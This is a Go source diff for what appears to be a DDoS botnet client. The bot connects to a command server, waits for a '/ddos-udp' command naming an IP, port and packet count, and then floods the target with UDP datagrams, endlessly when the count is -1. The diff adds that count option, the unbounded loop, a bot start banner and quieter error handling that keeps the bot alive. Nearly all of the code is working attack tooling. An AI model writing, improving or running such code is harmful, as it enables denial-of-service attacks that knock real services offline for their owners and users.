@@ -3,7 +3,9 @@ package main
 import (
 	"fmt"
 	"net"
+	"strconv"
 	"strings"
+	"time"
 )
 
 func CreateDatagramm(data string, address string, port string) (string, *net.UDPAddr) {
@@ -31,26 +33,42 @@ func sendUdp(data string, serverAddr *net.UDPAddr) {
 	}
 }
 
-func udpFlood(host string, port string) {
-	udpString := "pkg"
-	fmt.Println("[DOS] - Processing")
-	for i := 1; i <= 500_000; i++ {
-		data, serverAddr := CreateDatagramm(udpString, host, port)
-		sendUdp(data, serverAddr)
+func udpFlood(host string, port string, pkg_c int) {
+	udpString := "<DDL>UDP-FLOOD<DDL>"
+	data, serverAddr := CreateDatagramm(udpString, host, port)
+
+	fmt.Print("\n[DOS] - Processing")
+	fmt.Println(" - {")
+	fmt.Println("  UDP pkg := ", udpString)
+	fmt.Println("  addr := ", serverAddr)
+
+	if pkg_c != -1 {
+		for i := 0; i <= pkg_c; i++ {
+			sendUdp(data, serverAddr)
+		}
+	} else {
+		for {
+			sendUdp(data, serverAddr)
+		}
 	}
+	fmt.Print("} - ")
+	fmt.Println("<DDL>UDP-FLOOD -- STOPED")
+	fmt.Println("")
+
 }
-func getIpPort(str string) (string, string) {
+func getIpPortWC(str string) (string, string, int) {
 
 	cmdList := strings.Split(str, " ")
-
 	ip := cmdList[1]
+	Spkg_c := strings.Split(str, "-c ")[1]
+	pkg_c, _ := strconv.Atoi(Spkg_c)
 
 	if len(cmdList) > 2 {
 		port := cmdList[2]
 
-		return ip, port
+		return ip, port, pkg_c
 	}
-	return "None", "None"
+	return "None", "None", 0
 }
 func getSourceParram(cmd string) (string, error) {
 	paramsList := strings.Split(cmd, " ")
@@ -58,21 +76,27 @@ func getSourceParram(cmd string) (string, error) {
 	return paramsList[0], nil
 }
 
-// DDOS cmd -> DDOS 163.217.31.78 8888
+func status() {
+	fmt.Println("Status - Working . . .")
+}
+
+// DDOS cmd -> DDOS 163.217.31.78 8888 64
 func source(cmd string) {
 	cmdParam, _ := getSourceParram(cmd)
 
 	fmt.Println(cmd)
 
 	switch cmdParam {
-	case "/ddos":
-		ip, port := getIpPort(cmd)
-		udpFlood(ip, port)
+	case "/ddos-udp":
+		ip, port, pkg_c := getIpPortWC(cmd)
+		udpFlood(ip, port, pkg_c)
 
 	}
 }
 
 func main() {
+	fmt.Println("_<DDL>[BOT](START)_")
+
 	conn, _ := net.Dial("tcp", "localhost:6666")
 	buffer := make([]byte, 1024)
 
@@ -81,9 +105,9 @@ func main() {
 		req := string(buffer[:n])
 
 		if err != nil {
-			fmt.Println("[Err] -> Connection error in 57 line")
+			time.Sleep(1)
+		} else {
+			source(req)
 		}
-
-		source(req)
 	}
 }
